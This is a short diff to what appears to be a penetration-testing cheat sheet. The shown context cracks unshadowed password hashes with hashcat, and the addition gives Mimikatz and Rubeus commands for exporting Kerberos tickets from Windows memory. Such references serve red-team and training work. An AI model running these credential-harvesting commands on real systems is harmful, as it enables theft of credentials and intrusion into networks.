@@ -160,3 +160,15 @@ crack unshadowed hashes
 ```
 hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
 ```
+
+## Harvesting Kerberos Tickets from Windows
+
+Mimikatz - Export Tickets
+```
+sekurlsa::tickets /export
+```
+
+Rubeus - Export Tickets
+```
+Rubeus.exe dump /nowrap
+```
